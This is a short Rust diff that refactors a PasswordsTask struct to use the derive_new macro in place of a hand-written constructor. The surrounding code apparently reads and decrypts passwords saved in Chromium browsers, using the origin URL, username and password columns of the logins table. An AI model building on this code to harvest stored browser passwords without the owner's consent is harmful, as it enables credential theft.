@@ -2,6 +2,7 @@ use crate::chromium::{BrowserData, decrypt_data};
 use crate::{Password, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
 use alloc::borrow::ToOwned;
 use alloc::sync::Arc;
+use derive_new::new;
 use collector::{Browser, Collector};
 use database::TableRecord;
 use filesystem::FileSystem;
@@ -14,14 +15,9 @@ const LOGINS_ORIGIN_URL: usize = 0;
 const LOGINS_USERNAME_VALUE: usize = 3;
 const LOGINS_PASSWORD_VALUE: usize = 5;
 
+#[derive(new)]
 pub(super) struct PasswordsTask {
     browser: Arc<BrowserData>,
-}
-
-impl PasswordsTask {
-    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
-        Self { browser }
-    }
 }
 
 impl<C: Collector, F: FileSystem> Task<C, F> for PasswordsTask {
